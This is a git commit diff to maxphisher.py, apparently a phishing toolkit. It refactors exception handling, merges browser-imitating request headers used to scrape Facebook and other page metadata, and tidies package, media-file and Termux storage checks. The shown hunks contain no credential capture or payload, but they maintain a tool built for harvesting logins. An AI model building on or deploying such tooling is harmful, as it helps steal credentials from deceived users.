80f29b09e6c6f094b49a5075d43619c0650db92e
KasRoudra <78908440+KasRoudra@users.noreply.github.com>
2023-05-16 08:17:25 +0600

    Dev (#67)
    * Exception improvement
    
    * Lines reduced

--- maxphisher.py
+++ maxphisher.py
@@ -201,6 +201,7 @@ from requests import (
     head, 
     Session
 ) 
+from requests.exceptions import ConnectionError
 from rich.console import Console
 from rich.panel import Panel
 from rich.progress import (
@@ -337,11 +338,7 @@ ts_commands = {
 
 # Check if a process is running by 'command -v' command. If it has a output exit_code will be 0 and package is already installed
 def is_installed(package):
-    exit_code = bgtask(f"command -v {package}").wait() # system(f"command -v {package} > /dev/null 2>&1")
-    if exit_code == 0:
-        return True
-    return False
-
+    return bgtask(f"command -v {package}").wait() == 0
 
 # Check if a process is running by 'pidof' command. If pidof has a output exit_code will be 0 and process is running
 def is_running(process):
@@ -515,11 +512,14 @@ def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
 
 def get_meta(url):
     # Facebook requires some additional header
+    headers = {
+        "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36",
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
+    }
     if "facebook" in url:
-        headers = {
+        headers.update({
             "upgrade-insecure-requests": "1",
-            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
             "dnt": "1", 
             "content-type": "application/x-www-form-url-encoded",
             "origin": "https://m.facebook.com",
@@ -529,15 +529,8 @@ def get_meta(url):
             "sec-fetch-user": "empty", 
             "sec-fetch-dest": "document", 
             "sec-ch-ua-platform": "Android",
-            "accept-encoding": "gzip, deflate br", 
-            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
-        }
-    else:
-        headers = {
-            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.99 Safari/537.36", 
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
-            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
-        }
+            "accept-encoding": "gzip, deflate br"
+        })
     allmeta = ""
     try:
         response = get(url, headers=headers).text
@@ -677,9 +670,11 @@ def internet(url="https://api.github.com", timeout=5):
         try:
             head(url=url, timeout=timeout)
             break
-        except:
+        except ConnectionError:
             print(f"\n{error}No internet!{nc}\007")
             sleep(2)
+        except Exception as e:
+            print(f"{error}{str(e)}")
         
 # Send mail by smtp library
 def send_mail(msg):
@@ -786,13 +781,11 @@ def extract(filename, extract_path='.'):
         
 
 def get_media():
+    extension_filter = lambda filename: filename.split('.')[-1] in extensions
     media_files = []
-    for file in listdir(site_dir):
-        extension = file.split(".")[-1]
-        if extension in extensions:
-            if file=="desc.png" or file=="kk.jpg":
-                continue
-            media_files.append(f"{site_dir}/{file}")
+    for filename in filter(extension_filter, listdir(site_dir)):
+        if filename not in ["desc.png", "kk.jpg"]:
+            media_files.append(f"{site_dir}/{filename}")
     return media_files
 
 def write_meta(url):
@@ -1085,23 +1078,30 @@ def updater():
 # Installing packages and downloading tunnelers
 def requirements():
     global termux, cf_command, lx_command, is_mail_ok, email, password, receiver
+    # Termux may not have permission to write in saved_file.
+    # So we check if /sdcard is readable.
+    # If not execute termux-setup-storage to prompt user to allow
     if termux:
         try:
             if not isfile(saved_file):
                 mknod(saved_file)
             with open(saved_file) as checkfile:
                 data = checkfile.read()
-        except:
+        except (PermissionError, OSError):
             shell("termux-setup-storage")
+        except Exception as e:
+            print(f"{error}{str(e)}")
         try:
             if not isfile(saved_file):
                 mknod(saved_file)
             with open(saved_file) as checkfile:
                 data = checkfile.read()
-        except:
+        except (PermissionError, OSError):
             print(f"\n{error}You haven't allowed storage permission for termux. Closing \x50\x79\x50\x68\x69\x73\x68\x65\x72!\n")
             sleep(2)
             pexit()
+        except Exception as e:
+            print(f"{error}{str(e)}")
     internet()
     if termux:
         if not is_installed("proot"):
